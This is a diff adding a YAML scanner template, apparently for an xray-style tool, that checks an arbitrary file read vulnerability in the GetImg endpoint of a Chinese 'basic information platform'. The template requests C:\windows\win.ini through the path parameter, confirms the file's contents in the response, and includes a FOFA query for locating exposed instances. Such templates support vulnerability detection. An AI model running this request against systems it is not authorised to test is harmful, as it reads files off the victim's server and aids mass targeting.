@@ -1,0 +1,15 @@
+id: poc-yaml-infoearth-basic-information-platform-getimg-anyfile-read
+info:
+  name: 地大信息-基础信息平台 GetImg 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 基础信息平台
+  fofa: body="/SystemManage/BaseProject" || title=="基础信息平台"
+requests:
+- method: GET
+  path: /SystemManage/BaseProject/GetImg?path=C:\windows\win.ini
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"bit
+    app support") && !contains(body,"<") && contains(content_type,"image/jpeg")
+variables: {}
+transport: http
